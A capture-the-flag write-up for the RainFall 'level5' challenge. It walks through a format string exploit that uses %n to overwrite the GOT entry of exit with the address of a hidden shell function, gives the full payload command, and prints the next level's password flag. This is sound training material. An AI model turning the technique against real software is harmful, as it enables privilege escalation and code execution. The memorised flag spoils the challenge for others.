# level5 Exploit

## Steps

### 1. Decompile the Binary

Use GDB to disassemble the `level5` binary and understand its functionality:

```bash
level5@RainFall:~$ gdb level5
(gdb) disassemble main
(gdb) disassemble n
(gdb) disassemble o
```

You can convert the assembly code to C using the [CodeConvert](https://www.codeconvert.ai/assembly-to-c++-converter) tool for better understanding.

### 2. Check Available Functions

- The `n` function contains a vulnerable `printf` call because it doesn't use format specifiers.
- An `exit(1)` call is made just after the `printf` call.
- There is an `o` function that launches a shell but is never called:

```c
void o() {
  system("/bin/sh");
  _exit(1);
}
```

### Strategy

Overwrite the call to the `exit` function with a call to the `o` function to get a shell with the privileges needed to read `/home/user/level6/.pass`.

### 3. Find Function Addresses

Use GDB to find the addresses of the functions:

```bash
level5@RainFall:~$ gdb level5
(gdb) info functions
0x080484a4  o
0x080484c2  n
0x08048504  main
```

The address of the `o` function is `0x080484a4`, which is `\xa4\x84\x04\x08` in little-endian format.

To find the address of `exit`, use:

```bash
(gdb) disassemble exit
```

You should see:

```gdb
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>: jmp *0x8049838
   ...
```

The address of `exit` is `0x08049838`, which is `\x38\x98\x04\x08` in little-endian format.

### 4. Determine Format String Offset

Determine the position where `printf` writes the string:

```bash
level5@RainFall:~$ ./level5
AAAA%08x.%08x.%08x.%08x.%08x.%08x
```

The output reveals:

```
AAAA00000200.f7ee5580.00000000.41414141...
```

The `41414141` (corresponding to `AAAA` in ASCII) indicates that the `printf` argument position is at the 4th position.

### 5. Create the Exploit

The address of the `o` function in decimal is `134513828`. Subtract the 4 bytes of the address string: `134513828 - 4 = 134513824`.

Create the exploit string:

```bash
level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08%134513824d%4$n")'
```

### 6. Execute the Exploit

Execute the exploit while keeping `stdin` open:

```bash
level5@RainFall:~$ (python -c 'print("\x38\x98\x04\x08%134513824d%4$n")' ; cat) | ./level5
```

Once the shell is open, execute commands:

```bash
$ cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

### Explanation

1. **Format String Vulnerability**: `printf` without format specifiers allows unintended memory reads and writes.
2. **%n Specifier**: Used to write the number of characters printed so far to an address specified on the stack.
3. **Offset Calculation**: Determines where the format string parameters are on the stack to correctly position the address of `o`.
4. **Exploit String**: Crafted to write the address of `o` in place of the address of `exit`.